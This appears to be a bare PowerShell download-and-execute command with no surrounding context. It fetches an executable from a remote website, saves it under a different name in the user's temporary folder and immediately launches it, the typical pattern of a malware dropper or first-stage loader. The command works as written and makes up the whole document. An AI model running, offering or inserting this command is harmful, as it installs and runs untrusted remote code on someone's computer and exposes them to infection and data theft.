
(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/power/powex.exe',"$env:TEMP\powetfg.exe");Start-Process ("$env:TEMP\powetfg.exe")

